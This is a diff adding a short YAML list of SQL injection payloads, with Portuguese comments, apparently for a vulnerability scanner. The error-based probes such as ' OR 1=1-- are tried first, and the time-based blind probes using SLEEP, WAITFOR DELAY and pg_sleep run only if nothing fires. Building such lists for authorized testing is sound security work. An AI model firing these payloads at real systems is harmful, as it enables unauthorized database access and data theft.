@@ -1,0 +1,13 @@
+payloads:
+  # Error-based (testados primeiro; mais rápidos e conclusivos)
+  - "'"
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "\" OR \"1\"=\"1"
+  - "' AND '1'='2"
+  - "1' ORDER BY 1--"
+  # Time-based blind (só chegam a ser testados se nada de error-based disparar)
+  - "' AND SLEEP(5)--"
+  - "'; WAITFOR DELAY '0:0:5'--"
+  - "' AND pg_sleep(5)--"
+  - "1; SELECT pg_sleep(5)--"
